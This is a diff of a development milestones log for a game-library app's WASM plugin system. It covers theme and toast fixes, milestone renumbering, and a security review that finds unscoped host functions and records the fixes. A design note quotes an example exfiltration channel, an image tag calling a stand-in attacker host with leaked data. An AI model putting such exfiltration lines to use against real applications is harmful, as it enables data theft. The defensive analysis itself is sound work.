@@ -42,7 +42,7 @@ cross-reference.
   - Built-in `steam.rs`/`src/plugins/steam/index.ts` removed (and the now-unused `keyvalues-parser` dependency dropped from `src-tauri/Cargo.toml`) once the WASM version was confirmed working — the WASM plugin kept its `steam-wasm` id rather than renaming to `steam`, since renaming would silently desync anyone's already-persisted `enabled_plugins` setting
   - Migrating `games.install_dir`'s Steam usage into `plugin_data` — **won't-do**. `install_dir` is a shared, generic column every source plugin (Steam/Epic/GOG, WASM or TS) populates through the same path (`scan()` → `importEntries()` → `games.install_dir`), and `launchGame()`'s folder-based playtime tracking reads it back the same way regardless of which plugin produced the row - `steam-wasm` already participates in this correctly with zero special-casing. Migrating only Steam's slice into `plugin_data` would force `launchGame()` to special-case "if this game came from `steam-wasm`, look elsewhere" - reintroducing per-plugin awareness into the one place that's deliberately plugin-agnostic today, for no functional gain, and leaving Epic/GOG on the old column while Steam alone uses the new one. A uniform migration for *all* source plugins would be a coherent alternative but is real scope, not a small follow-up - tracked in Milestone 9 if ever wanted
 - Install-by-URL, redesigned and finally wired to real UI - the original `install_wasm_plugin` (paste a zip URL, optional SHA256) was written this milestone but never actually called from the frontend; steam-source-wasm-plugin's own CI (added later, publishes `plugin.json` + the compiled `.wasm` as two plain sibling release assets, not a zip) made the old zip-shaped contract wrong anyway. Redesigned: `fetch_wasm_plugin_manifest(url)` fetches and parses just the manifest first; `install_wasm_plugin(app, manifest_url)` derives the sibling `.wasm` URL (same directory, filename = the manifest's own `entry` field) and downloads/writes both files - no zip, no checksum param (dropped the now-unused `sha2` dependency along with it). Frontend: `AddPluginModal.vue` (already generic, built earlier for the data-theme install-by-URL flow) reused unchanged for the Source tab's "Add Plugin" button; a new `ConfirmInstallModal.vue` shows the fetched id/name/version/kind and asks for confirmation before the actual `.wasm` download happens, wired into a new `plugins.ts` preview/confirm/cancel flow (`previewInstall` rejects non-`"source"`-kind manifests early)
-- Real security gap found while designing that confirm dialog's warning copy - it's not accurate to call this "sandboxed" in any protective sense. Checked `wasm_plugins.rs`'s actual host-function implementations: `read-file`/`write-file`/`remove-dir`/`list-dir`/`path-exists`/`spawn-process`/`run-and-wait`/registry reads all take a caller-supplied path/executable with **zero scoping** - a plugin can read/write/delete anywhere the OS account can reach, or spawn any executable with any args. wasmtime's sandbox only guarantees memory-safety (can't corrupt host memory, can't escape linear memory) - it says nothing about what the *exposed host functions themselves* are allowed to do, and none of them are currently capability-restricted. Net: installing a WASM plugin from an untrusted URL today carries the same real-world risk as running an arbitrary downloaded `.exe` - the WASM boundary doesn't reduce that. Two real mitigations identified (see Milestone 13) - not implemented yet, so for now the confirm modal's copy was corrected to say so honestly instead of overclaiming protection, and the same caveat was added to the main README
+- Real security gap found while designing that confirm dialog's warning copy - it's not accurate to call this "sandboxed" in any protective sense. Checked `wasm_plugins.rs`'s actual host-function implementations: `read-file`/`write-file`/`remove-dir`/`list-dir`/`path-exists`/`spawn-process`/`run-and-wait`/registry reads all take a caller-supplied path/executable with **zero scoping** - a plugin can read/write/delete anywhere the OS account can reach, or spawn any executable with any args. wasmtime's sandbox only guarantees memory-safety (can't corrupt host memory, can't escape linear memory) - it says nothing about what the *exposed host functions themselves* are allowed to do, and none of them are currently capability-restricted. Net: installing a WASM plugin from an untrusted URL today carries the same real-world risk as running an arbitrary downloaded `.exe` - the WASM boundary doesn't reduce that. Two real mitigations identified (see Milestone 12) - not implemented yet, so for now the confirm modal's copy was corrected to say so honestly instead of overclaiming protection, and the same caveat was added to the main README
 - `wasm-plugins/` reorganized by kind - was a flat `<app data>/wasm-plugins/<id>/`, regardless of whether the plugin was a source or wrapper kind; now `<app data>/wasm-plugins/<kind>/<id>/`. `install_wasm_plugin` picks the subfolder from the manifest's own `kind` field, validated against a `SUPPORTED_KINDS` allowlist (`["source", "wrapper"]`, the only two WIT worlds that exist) first - `kind` is remote-controlled input that ends up as a path segment, so this also closes a path-traversal opening a crafted manifest could otherwise use. `list_wasm_plugins` scans each known kind subfolder instead of one flat directory. `wasm_plugin_runtime.rs`'s `plugin_dir()` gained a `kind` parameter, hardcoded per call site (`instantiate()` always resolves `source/`, `instantiate_wrapper()` always resolves `wrapper/`) rather than threaded from the frontend, since each Tauri command already only ever operates on one kind by construction. A real install from earlier testing (`wasm-plugins/steam-wasm/`, flat) was migrated by hand into the new `wasm-plugins/source/steam-wasm/` location rather than left to silently disappear from `list_wasm_plugins`'s output. Updated every WASM plugin repo's README install-path instructions and each repo's own copy of `wit/plugin.wit`'s `plugin-dir()` doc comment to match (doc-only in the WIT files - doesn't affect bindgen output, no rebuild needed on their end)
 
 ## Milestone 9 — Further WASM Adoption (stretch)
@@ -62,8 +62,8 @@ Natural follow-ups from Steam's real-world WASM migration, none required for any
   - **Component-override tier (`slots`) reviewed, found blocked.** Re-checked whether the reasoning above ("can't ever be externalized") still held, given how much the plugin system had grown since it was first written - it does, and worse than expected. Two candidate mechanisms:
     - **WASM export** - still structurally impossible, not just impractical. The Component Model can only cross typed functions/data (numbers, strings, records) over the host-guest boundary; a Vue component is a live object graph (render function, reactive `setup()`, lifecycle hooks) that has no representation on that boundary at all. No new WIT primitive or world design closes this - it's the same category of wall `Installable`-for-WASM already hit for settings UI, just for component rendering instead of config collection.
     - **Raw remote JS instead, bypassing WASM entirely** - this was in fact the *original* Milestone 8 plan before the pivot to WASM, and the reason for that pivot (`#[tauri::command]`s compile statically, so a JS-bundle plugin could only recombine capabilities the host already exposes, never add a new one) doesn't really bite here, since a theme component only renders `game` prop data it's already handed - no new native capability needed. But the security profile is a regression, not a wash: no memory-safety sandbox at all (same JS realm as the whole app, not an isolated one), full access to every already-exposed Tauri command rather than a narrow `host::` surface, and direct read/write access to every Pinia store in memory. The current CSP's `connect-src` lockdown (`ipc: http://ipc.localhost` only) would block a naive `fetch`-based exfil, but `img-src` still allows arbitrary `https:` - an `<img src="https://attacker.com/leak?data=...">` still works as a channel out even under today's CSP.
-    - Verdict: closing this out as reviewed-and-blocked rather than leaving it open-ended. Pursuing the JS-bundle route now would mean shipping a *less* constrained install-by-URL tier while the WASM one's own capability-sandboxing gap (Milestone 13) is still unresolved - a bigger regression, not a smaller one.
-    - **Moved to Milestone 17 (Post-1.0 Roadmap).** The blocking condition named above - Milestone 13's sandboxing gap being open - no longer holds; both Milestone 13 and 14 have since closed. Rather than silently leave a stale "blocked" verdict sitting inside an otherwise fully-closed Milestone 9, split it out as its own tracked Post-1.0 item so the now-outdated premise gets revisited on its own rather than assumed to still apply.
+    - Verdict: closing this out as reviewed-and-blocked rather than leaving it open-ended. Pursuing the JS-bundle route now would mean shipping a *less* constrained install-by-URL tier while the WASM one's own capability-sandboxing gap (Milestone 12) is still unresolved - a bigger regression, not a smaller one.
+    - **Moved to Milestone 17 (Post-1.0 Roadmap).** The blocking condition named above - Milestone 12's sandboxing gap being open - no longer holds; both Milestone 12 and 14 have since closed. Rather than silently leave a stale "blocked" verdict sitting inside an otherwise fully-closed Milestone 9, split it out as its own tracked Post-1.0 item so the now-outdated premise gets revisited on its own rather than assumed to still apply.
     - **Revisited the "genuinely safe alternative" against a real precedent.** Playnite - a mature, established app solving the exact same problem in this exact product category - was checked for how it handles theme customization deeper than plain color/CSS values. Its answer: themes are `.xaml` files (WPF's declarative UI markup), parsed and rendered by WPF's own engine, never compiled/executable code - confirms the earlier "constrained declarative card template" idea isn't a hypothetical, it's the pattern mature game-library-manager theme systems actually converge on once CSS alone isn't enough. Sharper framing than originally noted: this doesn't need to be built from scratch as "a small template engine" - Vue itself already ships a runtime template compiler (`@vue/compiler-sfc`/full-build Vue) that compiles a plain *string* of Vue template syntax into a render function at runtime, no `import()` of arbitrary JS involved at all. That's Concourse's direct equivalent of XAML, already available in a dependency already in use. The real remaining design work if this is ever pursued is scope, not tooling - the compiled template's expression scope would need to be tightly whitelisted to `game` fields plus known formatting helpers, not the ambient app context, since unrestricted `{{ }}` interpolation can still call whatever's in scope. Still not proposed for implementation now - this only upgrades the alternative from speculative to concretely buildable with tooling already on hand, it doesn't reopen the "blocked" verdict for the existing `slots` tier itself
     - **Scope note on what "importing Vue" for this would actually mean**, since it's not obvious upfront. `@vitejs/plugin-vue` precompiles every `.vue` file at build time (`@vue/compiler-sfc` runs in Node, never ships to the browser), so the app currently only bundles Vue's *runtime* (reactivity + renderer + `h`) - nothing needs to compile a template string post-build today. Runtime-compiling a theme-provided template string would need exactly one missing piece added: `@vue/compiler-dom`'s `compile()`. Not a second Vue instance - Vue's packages (`reactivity`/`runtime-core`/`runtime-dom`/`compiler-dom`) are modules of one versioned whole, so adding `compiler-dom` just plugs the missing piece into the runtime already loaded, same `h`/component model/reactivity, no duplication, as long as the version matches exactly. Should be lazy (`import('@vue/compiler-dom')` only when a plugin actually declares a template override, code-split out of the main bundle), not bundled unconditionally for users who never install one. Also worth being precise about, not overclaiming: `{{ }}` interpolations aren't inert data placeholders once compiled - they're real evaluated JS expressions against whatever's exposed on the render context. Not equivalent to raw JS `import()` (no arbitrary statements, no module loading, no reaching `window`/`document` unless explicitly put in scope), but not zero-JS-execution either - the actual security property comes entirely from how tightly that exposed scope gets whitelisted, not from the compiler mechanism itself
 - Rename `steam-wasm` → `steam` cleanly, if ever wanted, including a one-time migration for anyone's already-persisted `enabled_plugins` setting so it doesn't silently desync (not done as part of the initial migration - see Milestone 8's note) - **resolved differently.** Revisited once every WASM plugin (not just Steam) had accumulated the same cosmetic issue: `plugin.json`'s `name` field still said "Steam (WASM)"/"GOG (WASM)"/etc., a suffix that only ever meant "disambiguate from the coexisting built-in during migration/comparison" - now meaningless since every built-in (`steam.rs`, `gog.rs`, `epic.rs`, `sgdb.rs`, `igdb.rs`) is fully retired, and LR/LE never had one to begin with. Explicitly chose *not* to touch `id` (`steam-wasm`, `gog-wasm`, etc. all stay as-is) - that's the part with real migration risk (`enabled_plugins`/`active_theme_id`-style persisted settings reference ids, not names), and nothing about the display text needed it. Dropped "(WASM)" from `name` across all 7 plugin repos (`steam-source-wasm-plugin`, `gog-source-wasm-plugin`, `epic-source-wasm-plugin`, `sgdb-metadata-wasm-plugin`, `igdb-metadata-wasm-plugin`, `locale-remulator-wasm-plugin`, `locale-emulator-wasm-plugin`), bumped each to `0.1.1` (patch - cosmetic manifest field, no behavior/compatibility change) in both `plugin.json` and `Cargo.toml`. `.wasm` binaries themselves untouched (manifest is read from disk separately, never embedded in the compiled component), so no rebuild was needed - just re-verified each repo's `Cargo.toml` still parses (`cargo check`) and every edited `plugin.json` is still valid JSON
@@ -78,7 +78,7 @@ Natural follow-ups from Steam's real-world WASM migration, none required for any
 
 (Locale Remulator/Locale Emulator's WASM migration moved into Milestone 10, to run alongside their managed-install work instead of as a separate later pass.)
 
-## Milestone 14.5 — UI Polish (Continuous, ongoing)
+## Milestone 14 — UI Polish (Continuous, ongoing)
 Current UI was a single flat top-to-bottom stack (settings panels, forms, and grid all visible on one scrolling page) using the OS's default title bar and largely unstyled form controls - read as a webpage, not a desktop app. This milestone reworks visual structure/chrome for both Desktop UI and Big Picture without changing underlying functionality. This milestone doesn't close - UI polish is open-ended by nature; new items get appended in place in milestones.md. Originally numbered Milestone 9, sequenced between the WASM-adoption milestone (then 8.5, since renumbered to 9) and the LR/LE managed-install milestone (10); renumbered 14.5 once 1.0.0 shipped, since an ongoing, never-closing milestone doesn't belong inside the closed core roadmap's numbering.
 
 - Custom window chrome — `decorations: false` in `tauri.conf.json`, `TitleBar.vue` replaces the default OS title bar
@@ -192,6 +192,100 @@ Current UI was a single flat top-to-bottom stack (settings panels, forms, and gr
 - Filter bar bottom padding: added `var(--space-3)` as `.filters`' own bottom padding (was `0`, relying entirely on the external `margin-bottom` for spacing) - purely visual breathing room inside the pinned bar's own background before its content ends, distinct from the gap between the bar and the grid/list below it.
 - Verified via compiled CSS: `.filters[data-v-*]` now has `padding:var(--space-5) var(--space-6) var(--space-3)`. `bun run build`/`cargo check` both clean. Not visually re-verified live (no browser tooling available in this environment) - flagged same as every other pinned-bar change this session.
 
+**Added a "UI Test" sidebar tab, replacing the earlier throwaway test button.** New
+`AppView` value (`NavSidebar.vue`), new `UiTest.vue` component, wired into `App.vue`'s
+existing view-switch (`v-else-if`/`v-else` chain, now three branches instead of two). Moved
+the manual actionable-toast trigger here from its temporary spot in `AppSettings.vue`, and
+added four more: plain info/success/error toasts, plus a long-message one (to check text
+wrapping/sizing at a size the short test messages never exercised). All five are just manual
+UI-state triggers, not real functionality - explicitly labeled as such in the tab's own
+description text.
+
+**Fixed a real contrast bug in `.toast-info`, found via the Brick Block data theme.** User
+noticed info toasts were hard to read specifically under Brick Block - traced it to
+`.toast-info`'s `background: var(--color-surface1); color: var(--color-text)` pairing:
+Brick Block's `--color-surface1` (`#7c2c00`, a dark saturated brown - the same value used for
+button borders) paired with `--color-text` (`#1a1a2e`, dark navy) gives poor contrast, since
+`--color-text` assumes a light neutral background that `--color-surface1` isn't guaranteed to
+be. This is the exact same problem class already solved for buttons - `--color-button-text`
+exists specifically because "a theme with saturated/dark button backgrounds... can override
+just this one, without also recoloring body text" (its own doc comment in `styles.css`), and
+Brick Block already overrides it to white for that reason. Reused `--color-button-text` for
+`.toast-info` instead of `--color-text` - the default Catppuccin theme is unaffected (that
+token defaults to `var(--color-text)` there), only themes that override it (like Brick Block)
+get the improved contrast. Verified via compiled CSS. `bun run build`/`cargo check` both
+clean.
+
+**Two more toast fixes, both found via Brick Block again.** (1) `.toast-success` and
+`.toast-error` were both red under Brick Block - `--color-accent` (`#e52521`) and
+`--color-danger` (`#b71c1c`) are both red-family hues in that theme's palette, hard to tell
+apart at a glance. Switched `.toast-success` to `--color-accent-alt` instead of
+`--color-accent` - a theme's two brand colors are already meant to be visually distinct from
+each other by construction (that's the whole reason a theme declares two of them), unlike
+`--color-accent` vs `--color-danger`, which nothing guarantees are different hues. Happens to
+also line up with the near-universal "green means success" convention for Brick Block
+specifically (`--color-accent-alt: #43b047`, a real green) and stays a real, distinct color for
+the default Catppuccin theme too (purple vs. red), even though it's not literally "green"
+there. (2) Right-aligned `.toast-actions`' buttons (`justify-content: flex-end`) rather than
+left-flush, per direct request - didn't extend this to the update-offer toast specifically
+since the change is at the shared `.toast-actions` level, so it applies to every actionable
+toast uniformly, not just that one.
+- Verified via compiled CSS: `.toast-success{background:var(--color-accent-alt)}`,
+  `.toast-actions{...justify-content:flex-end...}`. `bun run build`/`cargo check` both clean.
+
+**Follow-up 1: `--color-accent-alt` reuse was wrong, tried a dedicated token.** User caught
+that switching `.toast-success` to `--color-accent-alt` recolors the default Catppuccin Latte
+theme's success toast from its old blue-ish accent to purple (`--color-accent-alt: #8839ef`
+there) - an unintended side effect of a Brick Block-specific fix. Confirmed via
+`grep -rln "color-accent-alt" src` that `.toast-success` was the only real *consumer* of the
+token (the other hits - `styles.css`'s own `:root` default plus the four
+`catppuccin-*/index.ts` files - only *declare* its per-theme value, they don't use it for
+anything else's appearance). No `--color-success` token had ever existed prior to this - the
+user's question named one, but the actual prior change was `--color-accent` -> `--color-accent-
+alt`, not from any `--color-success`.
+
+First fix attempt: added a new dedicated `--color-success` token to `styles.css`'s `:root`
+(`#40a02b`, Catppuccin Latte's "Green"), pointed `.toast-success` at it, gave Brick Block its
+own `--color-success: var(--color-accent-alt)` override in the sibling `data-theme-plugins`
+repo (version `1.3.1` -> `1.3.2`).
+
+**Follow-up 2: reverted the token, fixed Brick Block's palette instead.** User tested and
+reported every theme's success toast looked identical (all green) - because no theme other
+than Brick Block ever gave `--color-success` a distinct value; the token added a layer with
+no real per-theme variation, all cost no benefit. Reverted `styles.css`/`ToastContainer.vue`
+back to `.toast-success { background: var(--color-accent); }`, removed the `--color-success`
+declaration entirely. Root problem was always Brick Block's own palette, not the shared
+component: `--color-accent` (`#e52521`, red) and `--color-danger` (`#b71c1c`, dark red) are
+too close, and `--color-accent` is also used everywhere else (buttons, active tabs, tile
+focus ring), so recoloring the toast rule alone wouldn't have fixed those other surfaces
+either. Fixed at the source: Brick Block's `manifest.json` `--color-accent` changed from
+`#e52521` to `#0058f8` (a Mario pipe-blue, distinct from `--color-accent-alt`'s green and
+`--color-danger`'s dark red), version bumped `1.3.2` -> `1.3.3`. This recolors every
+`--color-accent`-driven surface in Brick Block, not just toasts - buttons, active nav/tabs,
+tile focus ring all shift from red to blue too, which is the intended, theme-wide effect this
+time, not a scoped side effect to work around.
+
+Copied the updated manifest into the app's local theme cache (`%APPDATA%/com.bloppy.concourse/
+data-themes/brick-block-data-theme/theme.json`) for live testing each time, same pattern as
+earlier in the session. `bun run build` clean at every step.
+
+**Follow-up 3: the active-tab recolor turned out unwanted too, given its own opt-in hook.**
+The blue `--color-accent` bumped in follow-up 2 also recolored `.accent-active` (the shared
+"selected" indicator class - active nav item, tag filter, and every Settings tab, defined once
+in `styles.css`, reused across `NavSidebar.vue`/`GameFilters.vue`/`PluginSettings.vue`). Unlike
+buttons/tile-focus-ring (fine staying blue), user wanted the selected-tab highlight to *not*
+follow the accent color change, without reverting `--color-accent` itself or hardcoding an
+exception into the shared class. Gave `.accent-active` its own opt-in hooks instead -
+`background: var(--accent-active-background, var(--color-accent))` /
+`color: var(--accent-active-color, var(--color-on-accent))` - same fallback-hook pattern
+already used for `--button-border-color`/`--tile-*`/`--card-*`. Every theme that doesn't
+declare these two new variables is byte-for-byte unaffected (falls through to
+`--color-accent` exactly as before). Brick Block's `manifest.json` sets
+`--accent-active-background: #fce303` (its existing cover-placeholder star yellow) /
+`--accent-active-color: #1a1a2e` (dark navy, for contrast on yellow), version bumped
+`1.3.3` -> `1.3.4`. Verified via `bun run build` (clean) and re-synced the local theme cache
+copy again.
+
 ## Milestone 10 — LR/LE Managed Install + WASM Migration
 Two LR/LE-focused workstreams combined into one milestone rather than spread across a later separate pass, since both touch the same two wrappers.
 
@@ -244,19 +338,19 @@ RAWG's search endpoint doesn't return the full description - only `/api/games/{i
 
 Real end-to-end testing (live API key) caught a genuine bug: searching "A Dance of Fire and Ice" returned the game's description with a completely unrelated "NOTE: Unity plugins will only work in Firefox/Safari/IE now..." browser-compatibility notice that doesn't appear on the actual game's RAWG page. Traced with a direct `curl` against RAWG's API (using the key already stored in the local `settings` table, read directly from `library.db` for debugging) rather than guessing: RAWG's search ranks by its own relevance score, not popularity/exactness, and for this query an obscure 2014 itch.io prototype ("A Dance of Fire and Ice (itch)", id 92339, 0 rating, 6 adds) outranks the real 2019 release (id 279033, rating 4.19, 407 adds) - `search_game`'s original `.next()` (first result) picked the prototype, whose own listing genuinely carries that stray note in its `description_raw`. Fixed by widening the search to 5 candidates (`page_size=5`) and preferring an exact case-insensitive `name` match over the raw relevance order, falling back to the first result only when nothing matches exactly - the real release's RAWG listing name is exactly "A Dance of Fire and Ice" with no suffix, so this reliably picks it. Confirmed via the same direct API check that id 279033's `description_raw` has no stray note. Considered `ordering=-added` as an alternative fix first but ruled it out after testing - RAWG's `ordering` param overrides search relevance entirely rather than combining with it, returning globally popular games unrelated to the query. Version bumped 0.1.0 → 0.1.1 (patch, bug fix, no manifest change)
 
-This single-`fetch_metadata` design (and `search_game`/`fetch_description`, named above) was superseded shortly after by the metadata-plugin interface v2 redesign (`search-candidates`/`fetch-metadata-by-id`, 0.2.0) - see the Milestone 14.5 entry for the full multi-provider story (combined candidate picker, per-candidate thumbnails, exact-match filtering applied to IGDB/SteamGridDB too). Milestone closed out: merge-priority behavior against IGDB (first-non-null-wins in `enabledIds` order) was exercised for real throughout that work - both providers enabled simultaneously, live fetches against real games, and the exact tie-break mechanism confirmed directly when asked - rather than needing a dedicated one-off test.
+This single-`fetch_metadata` design (and `search_game`/`fetch_description`, named above) was superseded shortly after by the metadata-plugin interface v2 redesign (`search-candidates`/`fetch-metadata-by-id`, 0.2.0) - see the Milestone 14 entry for the full multi-provider story (combined candidate picker, per-candidate thumbnails, exact-match filtering applied to IGDB/SteamGridDB too). Milestone closed out: merge-priority behavior against IGDB (first-non-null-wins in `enabledIds` order) was exercised for real throughout that work - both providers enabled simultaneously, live fetches against real games, and the exact tie-break mechanism confirmed directly when asked - rather than needing a dedicated one-off test.
 
-## Milestone 12 — Additional Source Plugins: Xbox/EA/Ubisoft (stretch)
-`proposal.md` lists these alongside Epic/GOG as source-plugin candidates; never scheduled. Each needs its own research pass (install detection method, manifest/registry format, launch mechanism) before implementation - unlike Epic/GOG, none of these were investigated during Milestone 7.
+## Milestone 16 — Additional Source Plugins: Xbox/EA/Ubisoft (stretch)
+`proposal.md` lists these alongside Epic/GOG as source-plugin candidates; never scheduled. Each needs its own research pass (install detection method, manifest/registry format, launch mechanism) before implementation - unlike Epic/GOG, none of these were investigated during Milestone 7. Originally slotted into the core roadmap's own numbering; moved to the Post-1.0 Roadmap once 1.0 shipped with this untouched (see that milestone's own entry below for the move itself).
 
-## Milestone 13 — WASM Plugin Capability Sandboxing (security)
+## Milestone 12 — WASM Plugin Capability Sandboxing (security)
 Opened directly out of Milestone 8's install-by-URL redesign (see that section) - writing the confirm dialog's warning copy forced an honest look at what the WASM sandbox actually protects against, and the answer was less than the "sandboxed" framing implied.
 
 Checked `wasm_plugins.rs`'s real `Host` trait implementations, not just the WIT interface's doc comments. `do_read_file`/`do_write_file`/`do_remove_dir`/`do_list_dir`/`do_path_exists` are literally `std::fs::*` called on a caller-supplied path with no scoping at all - a plugin can read/write/delete anywhere the OS account can reach (SSH keys, browser cookie DBs, wallet files, arbitrary overwrites). `do_spawn_process`/`do_run_and_wait` run any executable path with any args - full arbitrary code execution, no allowlist. `do_read_registry_string`/`do_list_registry_keys` read arbitrary registry hives/paths. `http-get`/`download-bytes` let a plugin exfiltrate whatever it read or beacon out.
 
 wasmtime's Component Model sandbox is real but narrower than it sounds: it guarantees memory safety (a plugin can't corrupt host memory or escape its own linear memory), not capability restriction. None of the host functions exposed through `wit/plugin.wit` are currently capability-scoped, so a syntactically valid, non-corrupt `.wasm` component that passes every sanity check (parses, loads, exports the right interface) can still do real damage simply by calling `spawn-process`/`write-file`/etc. with attacker-chosen arguments - the WASM boundary here is an ABI/portability boundary between host and guest, not a security boundary against a guest that's already trusted enough to be loaded. Net: today, installing a WASM plugin from an untrusted URL carries the same real-world risk as running an arbitrary downloaded `.exe`.
 
-Two real mitigations identified, not yet implemented (tracked as open Milestone 13 items):
+Two real mitigations identified, not yet implemented (tracked as open Milestone 12 items):
 - **Path allowlisting** - scope the file/registry primitives to a plugin-declared directory allowlist (e.g. `plugin-dir()` plus whatever install paths a source plugin legitimately needs to scan) instead of accepting arbitrary absolute paths. This is real OS-level sandboxing, enforced host-side regardless of what the guest tries.
 - **Permission gating on `spawn-process`/`run-and-wait`** - surface an explicit, visible "this plugin wants to run other programs" grant before install (mobile-app-permission-style) rather than silently allowing it. Doesn't stop a malicious plugin from calling it, but removes the silent part - nothing runs without the user having seen and agreed to that specific capability.
 
@@ -271,7 +365,7 @@ Interim, shipped this milestone: corrected `ConfirmInstallModal.vue`'s copy from
 - `WasmPluginManifest`/`PluginPreview` (`plugin_installer.rs`) and the TS `PluginManifest`/`PluginPreview` (`manifest.ts`) gained `capabilities: string[]` (`#[serde(default)]`/optional) - an array, not a single bool, so a future second capability tag (e.g. one for the still-open path-allowlisting item) doesn't need another breaking manifest change. `RUN_PROGRAMS_CAPABILITY = "run-programs"` exported as the one constant value today
 - Two UI surfaces, deliberately sharing the same underlying grant-write call rather than two different code paths: **new installs** (`ConfirmInstall.vue`) - if the fetched manifest declares `run-programs`, a checkbox appears ("This plugin runs other programs on your system... I understand and allow this"), Install stays disabled until checked, confirming writes the grant via `grant_plugin_capability` before the real install proceeds. **Already-installed plugins** (`PluginSettings.vue`, Source and Wrapper tabs) - any installed manifest declaring the capability without a recorded grant gets a "Permission needed" row with a Grant button. No silent grandfathering for plugins that predate this feature (Steam/GOG/Epic/LR/LE) - deliberately chosen over auto-granting them, since a silent grandfather clause would undercut the milestone's own "not silent" requirement; existing users click Grant once per plugin after upgrading, same one-time friction a brand-new install's checkbox already requires
 - Declared `"capabilities": ["run-programs"]` in all five plugins that actually call these functions (confirmed via `grep`, not assumed) - `steam-source-wasm-plugin`, `gog-source-wasm-plugin`, `epic-source-wasm-plugin`, `locale-remulator-wasm-plugin`, `locale-emulator-wasm-plugin` - each bumped `0.1.1` → `0.2.0` (minor: new capability declaration, backward compatible - an older Concourse build ignores the unknown manifest field and behaves exactly as before) and README'd with a `## Permissions` section. Steam and Epic's declarations are honestly noted as currently inert (their own READMEs already said `launch()` is dead code, since the host's own URI dispatch handles `steam://`/`com.epicgames.launcher://` directly) - declared anyway for forward-compatibility, since the WIT export exists and could become reachable later without a manifest change catching up to it then
-- Main README's Milestone 13 security note updated from "planned but not implemented" to reflect the real, narrowed state: `spawn-process`/`run-and-wait` are gated now, file/registry/network access still isn't
+- Main README's Milestone 12 security note updated from "planned but not implemented" to reflect the real, narrowed state: `spawn-process`/`run-and-wait` are gated now, file/registry/network access still isn't
 - Follow-up, prompted by the user asking exactly which games actually launch through a WASM plugin's `spawn-process` (answer: only GOG and LR/LE for real - Steam/Epic launch via `openUrl()` on their own URIs, never touching the plugin's `launch()` at all, confirmed by reading `library.ts`'s actual dispatch): Steam's and Epic's `launch()` implementations weren't just unreachable, they were latently broken - both called `host::spawn-process(&entry.executable_path, ...)` where `executable_path` is literally the `steam://`/`com.epicgames.launcher://` URI string, which would fail immediately if ever invoked (a URI can't be spawned as a process, the exact "OS error 123" class of bug `launcher.rs` already had to work around for the host's own dispatch). Fixed both to return a documented error instead of calling `spawn-process` at all, and dropped their now-pointless `run-programs` capability declaration (`0.2.0` → `0.2.1`, patch) - they never legitimately call the gated function anymore, so there's nothing to grant
 - Caught and fixed a real local dev-environment mistake while reinstalling these: an earlier `cp ... "$BASE/epic-wasm/"` step (during the original capability-declaration sync) collapsed into writing a flat file named `epic-wasm` directly under `wasm-plugins/source/` instead of a `epic-wasm/plugin.json` + `epic-wasm/<entry>.wasm` directory pair - same for `gog-wasm`. Both installed plugins were silently broken (no `.wasm` present at all) until caught by inspecting the actual directory listing rather than trusting the `cp` command's exit code; fixed by removing the flat files and recreating proper directories with both files copied in correctly
 - **A second, more serious mistake**: reported by the user as "no themes show up" - the real symptom was much bigger (`Uncaught (in promise) migration 1 was previously applied but has been modified`), meaning the whole DB connection failed to initialize, taking every store's `init()` down with it (themes just happened to be the first thing the user checked). Root cause: when `db.rs`'s `migrations()` was restructured from a single `Migration` to a `vec![...]` of two, migration v1's `sql` raw-string literal got re-indented in the process (one extra nesting level) even though its actual SQL content never changed. `tauri-plugin-sql` hashes each migration's exact content against its own ledger of what already ran - a whitespace-only change is still "modified" as far as that hash is concerned, and it refuses to proceed past a mismatch entirely, which cascaded into `settings`/`games`/every plugin manifest never loading, not just data-theme ones. Exactly the failure mode `db.rs`'s own comment already warned about ("its `sql`/`version` must never change - editing one in place desyncs that ledger"), triggered by mechanical reformatting rather than an intentional schema edit. Fixed by restoring v1's `sql` string byte-for-byte from the commit before the restructuring (confirmed via `diff` against that commit, not just eyeballed), leaving v2 as the only actually-new content. No manual DB repair needed - the ledger check is a live comparison against the current `migrations()` list, not a persisted "broken" flag, so matching the code back up self-heals on next launch
@@ -285,40 +379,40 @@ This split the fix into three pieces of very different difficulty, discussed and
 - Steam's `find_steam_library_folders()` now calls `request-read-scope` on its resolved install path before reading `libraryfolders.vdf`, and again on every additional library folder path extracted from it before that folder's `steamapps` directory gets listed. Rebuilt all three (`steam-source-wasm-plugin`/`gog-source-wasm-plugin`/`epic-source-wasm-plugin`), bumped `0.2.x` → `0.3.0` (minor: new capability surface, backward compatible) - discovered along the way that Steam's and GOG's local `wit/plugin.wit` copies were badly stale (missing everything added since early Milestone 8 - `write-file`/`remove-dir`/`list-registry-keys`/`run-and-wait`/`http-request`/etc.), pre-existing drift unrelated to this change but fully re-synced while touching these two repos anyway, since a stale WIT file is a real documentation hazard for anyone rebuilding from source even though it never affected the already-compiled binaries
 - No new frontend/UI work needed for this piece at all - unlike the `run-programs` capability gate, path scoping is fully host-enforced and silent-but-safe by design (a plugin either has a legitimate declared/verified scope or its call fails with a clear error), no install-time checkbox or Settings-panel grant button required
 
-**URL allowlisting for `http-get`/`http-request`/`download-bytes`, implemented - Milestone 13 fully closed.** Measured real usage first (`grep`, same discipline as the path allowlisting piece) rather than assuming a general mechanism was needed: Steam/GOG/Epic make zero network calls at all, and every plugin that does (LR/LE, IGDB, SGDB, RAWG) only ever talks to a small, fixed set of hostnames known at author time. `download-bytes`'s target for LR/LE is a *dynamic string* (`asset.browser_download_url`, not a literal in source) but it's always a URL GitHub's own release API returned, never attacker-influenced input - so even the one "dynamic-looking" case reduces to a static host once you check where the string actually comes from. No plugin needed anything resembling Steam's verified-elevation mechanism from the previous item; a plain static allowlist covers 100% of real usage.
+**URL allowlisting for `http-get`/`http-request`/`download-bytes`, implemented - Milestone 12 fully closed.** Measured real usage first (`grep`, same discipline as the path allowlisting piece) rather than assuming a general mechanism was needed: Steam/GOG/Epic make zero network calls at all, and every plugin that does (LR/LE, IGDB, SGDB, RAWG) only ever talks to a small, fixed set of hostnames known at author time. `download-bytes`'s target for LR/LE is a *dynamic string* (`asset.browser_download_url`, not a literal in source) but it's always a URL GitHub's own release API returned, never attacker-influenced input - so even the one "dynamic-looking" case reduces to a static host once you check where the string actually comes from. No plugin needed anything resembling Steam's verified-elevation mechanism from the previous item; a plain static allowlist covers 100% of real usage.
